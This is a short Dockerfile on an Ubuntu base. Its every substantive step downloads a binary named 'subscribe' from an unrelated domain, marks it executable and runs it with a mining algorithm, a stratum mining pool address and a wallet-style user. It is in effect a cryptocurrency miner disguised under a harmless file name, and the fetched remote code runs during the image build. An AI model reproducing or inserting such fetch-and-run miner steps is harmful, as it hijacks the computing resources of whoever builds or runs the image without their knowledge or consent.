FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17075 -u BZbVy934tse2cn2hn1oFkUBhu8M4HETNMM.oketo


